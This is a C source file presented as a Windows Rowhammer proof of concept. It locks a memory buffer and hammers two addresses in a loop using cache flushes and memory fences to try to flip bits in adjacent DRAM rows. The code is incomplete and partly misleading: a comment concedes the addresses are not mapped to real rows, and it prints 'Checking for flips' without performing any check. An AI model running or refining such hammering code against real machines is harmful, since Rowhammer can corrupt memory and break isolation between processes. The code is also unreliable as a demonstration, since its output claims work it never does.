#include <windows.h>
#include <intrin.h>
#include <stdio.h>
#include <stdint.h>

#pragma intrinsic(__clflush, __mfence)

int main() 
{
    // Increase the Working Set size so VirtualLock doesn't fail
    SIZE_T minSize = 1024 * 1024 * 32; // 32MB
    SIZE_T maxSize = 1024 * 1024 * 64; // 64MB

    if (!SetProcessWorkingSetSize(GetCurrentProcess(), minSize, maxSize)) 
        printf("Failed to set Working Set size. Error: %lu\n", GetLastError());

    // Ensure the memory is 'Locked' in RAM 
    // so Windows doesn't swap it to the Page File during the attack.
    size_t buffer_size = 1024 * 1024 * 16; // 16MB Buffer
    void* buffer = VirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (buffer == NULL) 
    {
        printf("Allocation failed. Error: %lu\n", GetLastError());
        return 1;
    }

    // Attempt to lock the virtual memory into physical RAM
    if (!VirtualLock(buffer, buffer_size)) 
        printf("VirtualLock failed. You may need higher privileges.\n");
    

    // For a real PoC, you'd need to map these to DRAM rows. 
    // Here we use offsets that are likely in different rows.
    volatile uint64_t* row_a = (uint64_t*)((uintptr_t)buffer + 0x1000); 
    volatile uint64_t* row_c = (uint64_t*)((uintptr_t)buffer + 0x3000); 

    printf("Starting Windows Rowhammer PoC on 11th Gen Intel...\n");

    for (int i = 0; i < 1000000; i++) 
    {
        // Read from the addresses to pull data into the cache
        uint64_t dummy1 = *row_a;
        uint64_t dummy2 = *row_c;

        // Force cache eviction using MSVC intrinsics
        _mm_clflush((void const*)row_a);
        _mm_clflush((void const*)row_c);

        // Memory fence to ensure order of execution
        _mm_mfence();
    }

    printf("Hammering complete. Checking for flips...\n");

    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}